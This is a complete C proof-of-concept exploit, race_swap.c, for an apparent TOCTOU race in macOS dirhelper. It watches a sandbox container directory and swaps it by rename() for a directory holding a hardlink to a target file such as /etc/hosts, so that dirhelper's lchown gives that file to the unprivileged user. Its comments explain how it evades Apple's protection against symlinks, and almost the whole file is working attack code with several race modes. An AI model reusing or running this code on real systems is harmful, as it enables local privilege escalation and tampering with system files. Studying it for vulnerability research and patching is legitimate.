/*
 * race_swap.c - Glarus PoC Component (FIXED - uses rename instead of symlink)
 * 
 * TOCTOU race condition exploit for macOS dirhelper vulnerability.
 * 
 * This component monitors the container Data directory for the creation
 * of the "tmp" subdirectory by dirhelper, then rapidly swaps the Data
 * directory with the Fake directory containing a hardlink to the target file.
 * 
 * CRITICAL FIX: Apple's sandbox infrastructure blocks creating symlinks 
 * named "Data" in container directories. We use rename() instead:
 *   rename(Data, Data_backup)
 *   rename(Fake, Data)
 * 
 * Race Condition:
 *   dirhelper: mkdir("Data/tmp")    [creates directory]
 *                    |
 *                    | <-- RACE WINDOW (~10-100 microseconds)
 *                    |
 *   dirhelper: lchown("Data/tmp")   [changes ownership]
 *                    |
 *   attacker:  rename Data -> Data_backup
 *              rename Fake -> Data   <-- NOT symlink!
 *                    |
 *   Result:    lchown operates on Fake/tmp (our hardlink to target)
 * 
 * Compilation:
 *   clang -O3 -o race_swap race_swap.c
 * 
 * Usage:
 *   ./race_swap -c com.glarus.poc -m spin -n 50000 -t /etc/hosts
 * 
 * Copyright (c) 2025 Golden Helm Securities
 * For authorized security research only.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/event.h>
#include <sys/time.h>
#include <pwd.h>

/*
 * Configuration Constants
 */
#define DEFAULT_TARGET      "/etc/hosts"
#define MAX_ATTEMPTS        100000
#define SPIN_ITERATIONS     1000

/*
 * Global State
 */
static volatile int g_running = 1;
static char g_container_name[256];  /* Bundle ID / container name */
static char g_container_base[1024]; /* Container base path */
static char g_data_dir[1024];       /* Container Data directory path */
static char g_data_backup[1024];    /* Backup path for Data directory */
static char g_fake_dir[1024];       /* Fake directory containing hardlink */
static char g_target_path[1024];    /* Path we're monitoring (Data/tmp) */
static char g_target_file[1024];    /* Target file to own */

/*
 * Swap failure tracking
 */
static int g_swap_fail_count = 0;
static int g_last_errno = 0;
static int g_fail_stage = 0;

/*
 * Signal handler for clean shutdown
 */
static void signal_handler(int sig) {
    (void)sig;
    g_running = 0;
    printf("\n[!] Interrupted - cleaning up...\n");
}

/*
 * Check if we won the race (target file is now owned by us)
 */
static int check_win(void) {
    struct stat st;
    uid_t myuid = getuid();
    
    if (stat(g_target_file, &st) == 0 && st.st_uid == myuid) {
        return 1;  /* Success! We own the target */
    }
    return 0;
}

/*
 * Recreate the Fake directory with hardlink
 * Called after undo_swap when we need to reset for another attempt
 */
static int recreate_fake(void) {
    struct stat st;
    char fake_tmp[1024];
    char cmd[2048];
    
    snprintf(fake_tmp, sizeof(fake_tmp), "%s/tmp", g_fake_dir);
    
    /* Remove existing Fake if present */
    if (lstat(g_fake_dir, &st) == 0) {
        snprintf(cmd, sizeof(cmd), "rm -rf '%s'", g_fake_dir);
        system(cmd);
    }
    
    /* Create Fake directory */
    if (mkdir(g_fake_dir, 0755) != 0 && errno != EEXIST) {
        return -1;
    }
    
    /* Create hardlink to target */
    if (link(g_target_file, fake_tmp) != 0) {
        return -1;
    }
    
    return 0;
}

/*
 * Perform the directory swap using RENAME (not symlink!)
 * 
 * This is the critical section - speed is essential.
 * We rename Data -> Data_backup, then rename Fake -> Data.
 * This causes any subsequent path resolution of "Data/tmp" to resolve
 * to what was "Fake/tmp" (our hardlink).
 * 
 * Returns: 0 on success, -1 on failure
 */
static inline int do_swap(void) {
    /* Step 1: Move Data directory out of the way */
    if (rename(g_data_dir, g_data_backup) != 0) {
        g_swap_fail_count++;
        g_last_errno = errno;
        g_fail_stage = 1;
        return -1;
    }
    
    /* Step 2: Move Fake directory into position as Data */
    if (rename(g_fake_dir, g_data_dir) != 0) {
        g_swap_fail_count++;
        g_last_errno = errno;
        g_fail_stage = 2;
        /* Restore on failure */
        rename(g_data_backup, g_data_dir);
        return -1;
    }
    
    return 0;
}

/*
 * Undo a swap operation (restore original state)
 * After this, we need to call recreate_fake() to set up for next attempt
 */
static inline void undo_swap(void) {
    struct stat st;
    char tmp_path[1024];
    
    /* Current state after swap: Data_backup has original Data, Data has Fake content */
    
    /* Step 1: Move current Data (was Fake) back to Fake position */
    if (lstat(g_data_dir, &st) == 0 && S_ISDIR(st.st_mode)) {
        /* Only move if it's a directory (not if swap failed partway) */
        rename(g_data_dir, g_fake_dir);
    }
    
    /* Step 2: Restore Data_backup to Data */
    if (lstat(g_data_backup, &st) == 0 && S_ISDIR(st.st_mode)) {
        rename(g_data_backup, g_data_dir);
    }
    
    /* Step 3: Remove tmp directory from Data so dirhelper creates it fresh */
    snprintf(tmp_path, sizeof(tmp_path), "%s/tmp", g_data_dir);
    rmdir(tmp_path);
    
    /* Step 4: Remove tmp from Fake (it was moved there) and recreate hardlink */
    snprintf(tmp_path, sizeof(tmp_path), "%s/tmp", g_fake_dir);
    rmdir(tmp_path);  /* Remove the directory that was there */
    
    /* Recreate the hardlink in Fake/tmp */
    link(g_target_file, tmp_path);
}

/*
 * Clean up stale Data_backup from previous runs
 */
static void cleanup_stale_backup(void) {
    struct stat st;
    
    if (lstat(g_data_backup, &st) == 0) {
        printf("[*] Removing stale Data_backup from previous run...\n");
        char cmd[2048];
        snprintf(cmd, sizeof(cmd), "rm -rf '%s' 2>/dev/null", g_data_backup);
        system(cmd);
    }
}

/*
 * Cleanup: Restore original directory state
 */
static void cleanup(void) {
    struct stat st;
    char tmp_path[1024];
    
    /* If Data doesn't exist but Data_backup does, restore it */
    if (lstat(g_data_dir, &st) != 0 && lstat(g_data_backup, &st) == 0) {
        rename(g_data_backup, g_data_dir);
    }
    
    /* Clean up tmp directory */
    snprintf(tmp_path, sizeof(tmp_path), "%s/tmp", g_data_dir);
    rmdir(tmp_path);
}

/*
 * Spin-based race loop
 * 
 * Continuously polls for directory existence with tight timing.
 * Highest CPU usage but fastest reaction time.
 */
static int race_spin(int max_attempts) {
    struct stat st;
    int attempt = 0;
    int swaps = 0;
    unsigned long spins = 0;
    char tmp_path[1024];
    
    snprintf(tmp_path, sizeof(tmp_path), "%s/tmp", g_data_dir);
    
    printf("[*] Race mode: SPIN (tight polling)\n");
    printf("[*] Monitoring: %s\n", g_target_path);
    printf("[*] Target: %s\n\n", g_target_file);
    
    while (g_running && attempt < max_attempts) {
        spins++;
        
        /* Check if tmp directory was created by dirhelper */
        if (stat(g_target_path, &st) == 0 && S_ISDIR(st.st_mode)) {
            attempt++;
            
            /* Execute swap immediately */
            if (do_swap() == 0) {
                swaps++;
                
                /* Brief busy-wait for lchown to execute */
                for (volatile int i = 0; i < SPIN_ITERATIONS; i++) {
                    /* Busy wait - don't yield to scheduler */
                }
                
                /* Check if we won */
                if (check_win()) {
                    printf("\n\n");
                    printf("╔══════════════════════════════════════════════════╗\n");
                    printf("║              🎉 RACE WON! 🎉                     ║\n");
                    printf("╚══════════════════════════════════════════════════╝\n\n");
                    printf("Target:   %s\n", g_target_file);
                    printf("New UID:  %d (you)\n", getuid());
                    printf("Attempts: %d\n", attempt);
                    printf("Swaps:    %d\n\n", swaps);
                    return 0;
                }
                
                /* Didn't win - restore and try again */
                undo_swap();
            } else {
                /* 
                 * Swap failed - remove the tmp directory so we wait for
                 * dirhelper to create a fresh one.
                 */
                rmdir(tmp_path);
            }
        }
        
        /* Progress indicator */
        if (spins % 1000000 == 0) {
            printf("\r[*] Spinning... (detections: %d, swaps: %d)", attempt, swaps);
            fflush(stdout);
        }
    }
    
    printf("\n[!] Race did not succeed after %d attempts (%d swaps)\n", attempt, swaps);
    if (g_swap_fail_count > 0) {
        printf("[!] do_swap() failed %d times\n", g_swap_fail_count);
        printf("[!] Last failure: stage=%d, errno=%d (%s)\n", 
               g_fail_stage, g_last_errno, strerror(g_last_errno));
    }
    return 1;
}

/*
 * Kqueue-based race loop
 * 
 * Uses kernel event notification for directory changes.
 * Lower CPU usage but may miss very narrow race windows.
 */
static int race_kqueue(int max_attempts) {
    int kq, data_fd;
    struct kevent change, event;
    struct stat st;
    int attempt = 0;
    int swaps = 0;
    char tmp_path[1024];
    
    snprintf(tmp_path, sizeof(tmp_path), "%s/tmp", g_data_dir);
    
    printf("[*] Race mode: KQUEUE (event-based)\n");
    printf("[*] Monitoring: %s\n", g_target_path);
    printf("[*] Target: %s\n\n", g_target_file);
    
    kq = kqueue();
    if (kq < 0) {
        perror("kqueue");
        return 1;
    }
    
    data_fd = open(g_data_dir, O_RDONLY | O_DIRECTORY);
    if (data_fd < 0) {
        perror("open Data dir");
        close(kq);
        return 1;
    }
    
    EV_SET(&change, data_fd, EVFILT_VNODE, EV_ADD | EV_CLEAR,
           NOTE_WRITE | NOTE_EXTEND, 0, NULL);
    
    if (kevent(kq, &change, 1, NULL, 0, NULL) < 0) {
        perror("kevent register");
        close(data_fd);
        close(kq);
        return 1;
    }
    
    struct timespec timeout = { 0, 100000000 }; /* 100ms */
    
    while (g_running && attempt < max_attempts) {
        int n = kevent(kq, NULL, 0, &event, 1, &timeout);
        
        if (n > 0) {
            /* Directory changed - check if tmp was created */
            if (stat(g_target_path, &st) == 0 && S_ISDIR(st.st_mode)) {
                attempt++;
                
                if (do_swap() == 0) {
                    swaps++;
                    
                    /* Brief wait */
                    for (volatile int i = 0; i < SPIN_ITERATIONS; i++) {}
                    
                    if (check_win()) {
                        printf("\n\n");
                        printf("╔══════════════════════════════════════════════════╗\n");
                        printf("║              🎉 RACE WON! 🎉                     ║\n");
                        printf("╚══════════════════════════════════════════════════╝\n\n");
                        printf("Target:   %s\n", g_target_file);
                        printf("New UID:  %d (you)\n", getuid());
                        printf("Attempts: %d\n", attempt);
                        printf("Swaps:    %d\n\n", swaps);
                        close(data_fd);
                        close(kq);
                        return 0;
                    }
                    
                    undo_swap();
                    
                    /* Re-open Data directory for monitoring */
                    close(data_fd);
                    data_fd = open(g_data_dir, O_RDONLY | O_DIRECTORY);
                    if (data_fd < 0) {
                        close(kq);
                        return 1;
                    }
                    EV_SET(&change, data_fd, EVFILT_VNODE, EV_ADD | EV_CLEAR,
                           NOTE_WRITE | NOTE_EXTEND, 0, NULL);
                    kevent(kq, &change, 1, NULL, 0, NULL);
                } else {
                    rmdir(tmp_path);
                }
            }
        }
        
        if (attempt % 100 == 0 && attempt > 0) {
            printf("\r[*] Attempt %d/%d (swaps: %d)", attempt, max_attempts, swaps);
            fflush(stdout);
        }
    }
    
    close(data_fd);
    close(kq);
    
    printf("\n[!] Race did not succeed after %d attempts (%d swaps)\n", attempt, swaps);
    return 1;
}

/*
 * Hybrid race loop
 * 
 * Uses kqueue for initial detection, then tight spin for the swap.
 * Best balance of CPU usage and race window capture.
 */
static int race_hybrid(int max_attempts) {
    int kq, data_fd;
    struct kevent change, event;
    struct stat st;
    int attempt = 0;
    int swaps = 0;
    char tmp_path[1024];
    
    snprintf(tmp_path, sizeof(tmp_path), "%s/tmp", g_data_dir);
    
    printf("[*] Race mode: HYBRID (kqueue + spin)\n");
    printf("[*] Monitoring: %s\n", g_target_path);
    printf("[*] Target: %s\n\n", g_target_file);
    
    kq = kqueue();
    if (kq < 0) {
        perror("kqueue");
        return 1;
    }
    
    data_fd = open(g_data_dir, O_RDONLY | O_DIRECTORY);
    if (data_fd < 0) {
        perror("open Data dir");
        close(kq);
        return 1;
    }
    
    EV_SET(&change, data_fd, EVFILT_VNODE, EV_ADD | EV_CLEAR,
           NOTE_WRITE | NOTE_EXTEND | NOTE_ATTRIB, 0, NULL);
    
    if (kevent(kq, &change, 1, NULL, 0, NULL) < 0) {
        perror("kevent register");
        close(data_fd);
        close(kq);
        return 1;
    }
    
    struct timespec timeout = { 0, 50000000 }; /* 50ms */
    
    while (g_running && attempt < max_attempts) {
        int n = kevent(kq, NULL, 0, &event, 1, &timeout);
        
        if (n > 0) {
            /* Event detected - spin tightly checking for tmp */
            for (int spin = 0; spin < 10000 && g_running; spin++) {
                if (stat(g_target_path, &st) == 0 && S_ISDIR(st.st_mode)) {
                    attempt++;
                    
                    if (do_swap() == 0) {
                        swaps++;
                        
                        /* Tight busy-wait */
                        for (volatile int i = 0; i < SPIN_ITERATIONS; i++) {}
                        
                        if (check_win()) {
                            printf("\n\n");
                            printf("╔══════════════════════════════════════════════════╗\n");
                            printf("║              🎉 RACE WON! 🎉                     ║\n");
                            printf("╚══════════════════════════════════════════════════╝\n\n");
                            printf("Target:   %s\n", g_target_file);
                            printf("New UID:  %d (you)\n", getuid());
                            printf("Attempts: %d\n", attempt);
                            printf("Swaps:    %d\n\n", swaps);
                            close(data_fd);
                            close(kq);
                            return 0;
                        }
                        
                        undo_swap();
                        
                        /* Re-open for monitoring */
                        close(data_fd);
                        data_fd = open(g_data_dir, O_RDONLY | O_DIRECTORY);
                        if (data_fd < 0) {
                            close(kq);
                            return 1;
                        }
                        EV_SET(&change, data_fd, EVFILT_VNODE, EV_ADD | EV_CLEAR,
                               NOTE_WRITE | NOTE_EXTEND | NOTE_ATTRIB, 0, NULL);
                        kevent(kq, &change, 1, NULL, 0, NULL);
                        break;
                    } else {
                        rmdir(tmp_path);
                        break;
                    }
                }
            }
        }
        
        if (attempt % 100 == 0 && attempt > 0) {
            printf("\r[*] Attempt %d/%d (swaps: %d)", attempt, max_attempts, swaps);
            fflush(stdout);
        }
    }
    
    close(data_fd);
    close(kq);
    
    printf("\n[!] Race did not succeed after %d attempts (%d swaps)\n", attempt, swaps);
    if (g_swap_fail_count > 0) {
        printf("[!] do_swap() failed %d times\n", g_swap_fail_count);
        printf("[!] Last failure: stage=%d, errno=%d (%s)\n", 
               g_fail_stage, g_last_errno, strerror(g_last_errno));
    }
    return 1;
}

/*
 * Print usage information
 */
static void usage(const char *prog) {
    printf("Glarus Race Swap - TOCTOU Exploit Component\n\n");
    printf("Usage: %s [options]\n\n", prog);
    printf("Options:\n");
    printf("  -c <bundle>   Container bundle ID (REQUIRED)\n");
    printf("  -m <mode>     Race mode: spin, kqueue, hybrid (default: hybrid)\n");
    printf("  -n <attempts> Maximum attempts (default: %d)\n", MAX_ATTEMPTS);
    printf("  -t <file>     Target file to own (default: %s)\n", DEFAULT_TARGET);
    printf("  -h            Show this help\n\n");
    printf("Modes:\n");
    printf("  spin   - Tight polling loop (highest CPU, fastest)\n");
    printf("  kqueue - Event-based monitoring (lowest CPU, may miss narrow windows)\n");
    printf("  hybrid - Combination approach (recommended)\n\n");
    printf("NOTE: This version uses rename() instead of symlink() to bypass\n");
    printf("      Apple's sandbox infrastructure protection on 'Data' symlinks.\n\n");
}

/*
 * Main entry point
 */
int main(int argc, char *argv[]) {
    char *home;
    const char *mode = "hybrid";
    const char *target = DEFAULT_TARGET;
    const char *container = NULL;
    int max_attempts = MAX_ATTEMPTS;
    int opt;
    struct stat st;
    
    /* Parse command line arguments */
    while ((opt = getopt(argc, argv, "c:m:n:t:h")) != -1) {
        switch (opt) {
            case 'c': container = optarg; break;
            case 'm': mode = optarg; break;
            case 'n': max_attempts = atoi(optarg); break;
            case 't': target = optarg; break;
            case 'h':
            default:
                usage(argv[0]);
                return (opt == 'h') ? 0 : 1;
        }
    }
    
    /* Validate required arguments */
    if (!container) {
        fprintf(stderr, "ERROR: Container bundle ID required (-c option)\n\n");
        usage(argv[0]);
        return 1;
    }
    
    /* Store container name and target file path */
    strncpy(g_container_name, container, sizeof(g_container_name) - 1);
    g_container_name[sizeof(g_container_name) - 1] = '\0';
    strncpy(g_target_file, target, sizeof(g_target_file) - 1);
    g_target_file[sizeof(g_target_file) - 1] = '\0';
    
    /* Get home directory */
    home = getenv("HOME");
    if (!home) {
        struct passwd *pw = getpwuid(getuid());
        if (pw) home = pw->pw_dir;
    }
    if (!home) {
        fprintf(stderr, "ERROR: Cannot determine home directory\n");
        return 1;
    }
    
    /* Build paths */
    snprintf(g_container_base, sizeof(g_container_base),
             "%s/Library/Containers/%s", home, g_container_name);
    snprintf(g_data_dir, sizeof(g_data_dir),
             "%s/Data", g_container_base);
    snprintf(g_data_backup, sizeof(g_data_backup),
             "%s/Data_backup", g_container_base);
    snprintf(g_fake_dir, sizeof(g_fake_dir),
             "%s/Fake", g_container_base);
    snprintf(g_target_path, sizeof(g_target_path),
             "%s/tmp", g_data_dir);
    
    /* Print configuration */
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║  Glarus Race Swap - TOCTOU Exploit (RENAME method)       ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");
    printf("Configuration:\n");
    printf("  Bundle ID:    %s\n", g_container_name);
    printf("  Data dir:     %s\n", g_data_dir);
    printf("  Fake dir:     %s\n", g_fake_dir);
    printf("  Target file:  %s\n", g_target_file);
    printf("  Mode:         %s\n", mode);
    printf("  Max attempts: %d\n\n", max_attempts);
    
    /* Verify setup */
    printf("[*] Verifying setup...\n");
    
    /* Check Data directory exists and is a directory */
    if (lstat(g_data_dir, &st) != 0) {
        fprintf(stderr, "    ✗ Data directory missing: %s\n", g_data_dir);
        fprintf(stderr, "    ! Run scripts/setup.sh first\n");
        return 1;
    }
    
    if (S_ISLNK(st.st_mode)) {
        fprintf(stderr, "    ! Data is a symlink (leftover from old method)\n");
        fprintf(stderr, "    ! Run scripts/cleanup.sh to reset\n");
        return 1;
    }
    
    if (!S_ISDIR(st.st_mode)) {
        fprintf(stderr, "    ✗ Data is not a directory: %s\n", g_data_dir);
        return 1;
    }
    printf("    ✓ Data directory exists\n");
    
    /* Check Fake directory */
    if (stat(g_fake_dir, &st) != 0 || !S_ISDIR(st.st_mode)) {
        fprintf(stderr, "    ✗ Fake directory missing: %s\n", g_fake_dir);
        fprintf(stderr, "    ! Run scripts/setup.sh %s first\n", g_target_file);
        return 1;
    }
    printf("    ✓ Fake directory exists\n");
    
    /* Check Fake/tmp (hardlink) */
    char fake_tmp[1024];
    snprintf(fake_tmp, sizeof(fake_tmp), "%s/tmp", g_fake_dir);
    if (stat(fake_tmp, &st) != 0) {
        fprintf(stderr, "    ✗ Fake/tmp missing (hardlink not created)\n");
        fprintf(stderr, "    ! Run scripts/setup.sh %s first\n", g_target_file);
        return 1;
    }
    printf("    ✓ Fake/tmp exists (inode: %llu)\n", (unsigned long long)st.st_ino);
    
    /* Verify hardlink to target */
    ino_t fake_ino = st.st_ino;
    if (stat(g_target_file, &st) == 0) {
        if (st.st_ino == fake_ino) {
            printf("    ✓ Hardlink verified (same inode as target)\n");
        } else {
            fprintf(stderr, "    ✗ Inode mismatch - Fake/tmp is not linked to target\n");
            fprintf(stderr, "      Fake/tmp inode: %llu\n", (unsigned long long)fake_ino);
            fprintf(stderr, "      Target inode:   %llu\n", (unsigned long long)st.st_ino);
            fprintf(stderr, "    ! Run scripts/setup.sh %s to recreate\n", g_target_file);
            return 1;
        }
    } else {
        fprintf(stderr, "    ✗ Cannot stat target file: %s\n", g_target_file);
        return 1;
    }
    
    /* Clean up any stale Data_backup from previous runs */
    cleanup_stale_backup();
    
    printf("\n");
    
    /* Set up signal handlers */
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    atexit(cleanup);
    
    /* Run the appropriate race mode */
    int result;
    if (strcmp(mode, "spin") == 0) {
        result = race_spin(max_attempts);
    } else if (strcmp(mode, "kqueue") == 0) {
        result = race_kqueue(max_attempts);
    } else if (strcmp(mode, "hybrid") == 0) {
        result = race_hybrid(max_attempts);
    } else {
        fprintf(stderr, "Unknown mode: %s\n", mode);
        usage(argv[0]);
        return 1;
    }
    
    /* Show final result */
    if (result == 0) {
        printf("Success! File ownership:\n");
        char cmd[1200];
        snprintf(cmd, sizeof(cmd), "ls -la '%s'", g_target_file);
        system(cmd);
        printf("\n");
    }
    
    return result;
}
